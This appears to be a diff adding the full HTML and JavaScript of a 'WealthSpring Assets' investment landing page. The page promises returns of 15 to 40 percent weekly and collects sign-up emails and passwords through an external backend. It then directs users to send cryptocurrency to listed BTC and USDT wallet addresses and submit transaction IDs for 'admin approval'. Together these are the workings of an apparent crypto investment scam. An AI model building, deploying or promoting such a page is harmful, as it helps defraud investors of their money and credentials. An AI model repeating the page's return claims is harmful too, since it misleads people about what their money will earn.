@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>WealthSpring Assets</title>
+<script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-[#0a0a0a] text-white">
+<nav class="flex justify-between p-5 max-w-7xl mx-auto">
+<h1 class="text-2xl font-bold"><span class="text-yellow-500">Wealth</span>Spring</h1>
+<div class="flex gap-3">
+<button onclick="openModal('login')" class="px-5 py-2 border border-white/20 rounded-full">Login</button>
+<button onclick="openModal('register')" class="px-5 py-2 bg-yellow-500 text-black font-bold rounded-full">Get Started</button>
+</div>
+</nav>
+<section class="text-center py-20 px-5">
+<h2 class="text-5xl font-extrabold">Grow Your Wealth<br><span class="text-yellow-500">With Confidence</span></h2>
+<button onclick="openModal('register')" class="mt-8 px-8 py-4 bg-yellow-500 text-black font-bold rounded-full">Start Investing</button>
+<div class="mt-4 text-sm text-white/40">Backend: <span class="text-green-400">LIVE</span></div>
+</section>
+<section class="max-w-7xl mx-auto px-5 grid md:grid-cols-3 gap-6 pb-20">
+<div class="bg-white/5 border border-white/10 p-8 rounded-[24px]"><h3>Starter</h3><div class="text-4xl font-bold mt-4">$100-$999</div><div class="text-yellow-500 mt-2">15% Weekly</div><button onclick="startInvest('Starter',100)" class="w-full mt-6 py-3 bg-white text-black font-bold rounded-full">Invest</button></div>
+<div class="bg-yellow-500 text-black p-8 rounded-[24px]"><h3>Growth</h3><div class="text-4xl font-bold mt-4">$1k-$4,999</div><div class="font-bold mt-2">25% Weekly</div><button onclick="startInvest('Growth',1000)" class="w-full mt-6 py-3 bg-black text-white font-bold rounded-full">Invest</button></div>
+<div class="bg-white/5 border border-white/10 p-8 rounded-[24px]"><h3>Premium</h3><div class="text-4xl font-bold mt-4">$5,000+</div><div class="text-yellow-500 mt-2">40% Weekly</div><button onclick="startInvest('Premium',5000)" class="w-full mt-6 py-3 bg-white text-black font-bold rounded-full">Invest</button></div>
+</section>
+<div id="modal" class="fixed inset-0 bg-black/80 hidden items-center justify-center p-5 z-50"><div class="bg-[#1a1a1a] w-full max-w-md rounded-[24px] p-8 border border-white/10">
+<div class="flex justify-between"><h3 id="modalTitle" class="text-2xl font-bold">Register</h3><button onclick="closeModal()">X</button></div>
+<div id="registerForm" class="mt-6 space-y-4"><input id="regEmail" placeholder="Email" class="w-full p-4 bg-white/5 rounded-xl border border-white/10"><input id="regPass" type="password" placeholder="Password" class="w-full p-4 bg-white/5 rounded-xl border border-white/10"><button onclick="doRegister()" class="w-full py-4 bg-yellow-500 text-black font-bold rounded-full">Create Account</button></div>
+<div id="loginForm" class="mt-6 space-y-4 hidden"><input id="logEmail" placeholder="Email" class="w-full p-4 bg-white/5 rounded-xl border border-white/10"><input id="logPass" type="password" placeholder="Password" class="w-full p-4 bg-white/5 rounded-xl border border-white/10"><button onclick="doLogin()" class="w-full py-4 bg-yellow-500 text-black font-bold rounded-full">Login</button></div>
+<div id="depositForm" class="mt-6 space-y-4 hidden"><div class="bg-black p-4 rounded-xl text-xs break-all"><p class="text-white/40">BTC</p><p class="text-yellow-500 font-bold">bc1qmww3778u3w409wjthpp5gyqjxj9fesqcq8maez</p><p class="text-white/40 mt-3">USDT BEP20</p><p class="text-yellow-500 font-bold">0xcF1e36b4c1666f42F34A8616FAe80Fc30440F8D9</p></div><input id="depAmount" placeholder="Amount" class="w-full p-4 bg-white/5 rounded-xl border border-white/10"><select id="depMethod" class="w-full p-4 bg-[#1a1a1a] rounded-xl"><option value="btc">BTC</option><option value="usdt_bep20">USDT BEP20</option></select><input id="depTx" placeholder="TX ID" class="w-full p-4 bg-white/5 rounded-xl border border-white/10"><button onclick="doDeposit()" class="w-full py-4 bg-yellow-500 text-black font-bold rounded-full">Submit Deposit</button><p class="text-xs text-center text-white/40">Support: support@wealthspringassets.com</p></div>
+<p id="msg" class="mt-4 text-center text-sm text-green-400"></p>
+</div></div>
+<script>
+const API='https://wealthspring-backend.onrender.com';let currentUser=localStorage.getItem('ws_email')||'';
+function openModal(t){document.getElementById('modal').classList.remove('hidden');document.getElementById('modal').classList.add('flex');document.getElementById('registerForm').classList.add('hidden');document.getElementById('loginForm').classList.add('hidden');document.getElementById('depositForm').classList.add('hidden');if(t==='register'){document.getElementById('modalTitle').innerText='Create Account';document.getElementById('registerForm').classList.remove('hidden')}if(t==='login'){document.getElementById('modalTitle').innerText='Welcome Back';document.getElementById('loginForm').classList.remove('hidden')}if(t==='deposit'){document.getElementById('modalTitle').innerText='Make Deposit';document.getElementById('depositForm').classList.remove('hidden')}}
+function closeModal(){document.getElementById('modal').classList.add('hidden')}
+function startInvest(p,a){if(!currentUser){openModal('register');return}document.getElementById('depAmount').value=a;openModal('deposit')}
+async function doRegister(){const email=document.getElementById('regEmail').value;const password=document.getElementById('regPass').value;document.getElementById('msg').innerText='Creating...';try{const r=await fetch(API+'/api/register',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email,password})});const d=await r.json();if(d.error){document.getElementById('msg').innerText=d.error;return}localStorage.setItem('ws_email',email);currentUser=email;document.getElementById('msg').innerText='Created! Now deposit.';setTimeout(()=>openModal('deposit'),1000)}catch(e){document.getElementById('msg').innerText='Backend waking, try again in 20s'}}
+async function doLogin(){const email=document.getElementById('logEmail').value;const password=document.getElementById('logPass').value;try{const r=await fetch(API+'/api/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email,password})});const d=await r.json();if(d.error){document.getElementById('msg').innerText=d.error;return}localStorage.setItem('ws_email',email);currentUser=email;document.getElementById('msg').innerText='Logged in!';setTimeout(()=>openModal('deposit'),1000)}catch(e){document.getElementById('msg').innerText='Error, try again'}}
+async function doDeposit(){const amount=document.getElementById('depAmount').value;const method=document.getElementById('depMethod').value;const txId=document.getElementById('depTx').value;const email=currentUser;if(!amount||!txId){document.getElementById('msg').innerText='Enter amount and TX';return}try{const r=await fetch(API+'/api/deposit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email,amount,method,txId})});document.getElementById('msg').innerText='Deposit submitted! Admin will approve.';setTimeout(closeModal,2000)}catch(e){document.getElementById('msg').innerText='Error'}}
+</script>
+</body>
+</html>
